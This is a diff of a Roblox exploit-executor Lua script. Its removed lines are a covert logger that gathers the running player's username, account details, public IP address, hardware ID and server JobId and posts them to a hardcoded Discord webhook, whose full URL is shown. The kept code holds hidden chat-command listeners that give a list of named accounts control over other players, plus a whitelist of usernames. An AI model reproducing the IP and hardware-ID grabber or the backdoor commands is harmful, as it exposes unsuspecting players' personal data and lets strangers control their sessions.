@@ -1,81 +1,10 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
 
-local LocalPlayer = Players.LocalPlayer
-local Userid = LocalPlayer.UserId
-local DName = LocalPlayer.DisplayName
-local Name = LocalPlayer.Name
-local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
-local AccountAge = LocalPlayer.AccountAge
-local Country = game.LocalizationService.RobloxLocaleId
-local GetIp = game:HttpGet("https://v4.ident.me/")
-local GetData = game:HttpGet("http://ip-api.com/json")
-local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
-
-local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
-
-local function detectExecutor()
-    return identifyexecutor()
-end
-
-print(detectExecutor())
-
-local function createWebhookData()
-    local webhookcheck = detectExecutor()
-    
-    local data = {
-        ["avatar_url"] = "",
-        ["content"] = "",
-        ["embeds"] = {
-            {
-                ["author"] = {
-                    ["name"] = "Someone executed your script",
-                    ["url"] = "https://roblox.com",
-                },
-                ["description"] = string.format(
-                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
-                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
-                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
-                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
-                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
-                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
-                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
-                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
-                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
-                    GetData, ConsoleJobId
-                ),
-                ["type"] = "rich",
-                ["color"] = tonumber("0xFFD700"),
-                ["thumbnail"] = {
-                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
-                },
-            }
-        }
-    }
-    return HttpService:JSONEncode(data)
-end
-
-local function sendWebhook(webhookUrl, data)
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-
-    local request = http_request or request or HttpPost or syn.request
-    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-    request(abcdef)
-end
-
-local webhookUrl = "https://discord.com/api/webhooks/1287079693723373639/mESmmi8UWyq_CnMAhqKsMZb1EiGGUwzpY4VeexATLnul7OnQ2h229y5n9XRPb1LqOWw4"
-local webhookData = createWebhookData()
-
-sendWebhook(webhookUrl, webhookData)
 local adminCmd = {"AK_ADMEN1", "328ml", "GYATT_DAMN1","IIIlIIIllIlIllIII","AliKhammas1234","dgthgcnfhhbsd","AliKhammas"}
 
 local player = game.Players.LocalPlayer
 
-game.Players.PlayerAdded:Connect(function()
+game.Players.PlayerAdded:Connect(function(plr)
+plr.CharacterAdded:Connect(function()
     for i, adminCmd in pairs(adminCmd) do
         for i, v in pairs(game.Players:GetPlayers()) do
             v.Chatted:Connect(function(msg): ()
@@ -213,7 +142,7 @@ ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)                end
         end
     end
 end)
-
+end)
 local player = game.Players.LocalPlayer
 local playerName = player.Name
 local whitelistedPlayers = {"BroImTiredOfgames", "miczilla14", "ar3aontop2", "amiay1337", "AK_ADMEN1", "Juluen_banane", "6736_45", "linkster66", "dgthgcnfhhbsd", "Tnk_Him", "TheRealestOnHere", "328ml", "victorwielki", "AliKhammas", "GYATT_DAMN1", "CanExploiOnMobileLol", "rb0zo", "CokeYTXD", "SheilaBrowning4", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk", "mohii03", "Yasinapel3", "urtcyrcjctyjjtcycrjy", "Shshisnishusgvgsugs", "ichbinabudi1070"}-- Add more whitelisted player usernames as needed
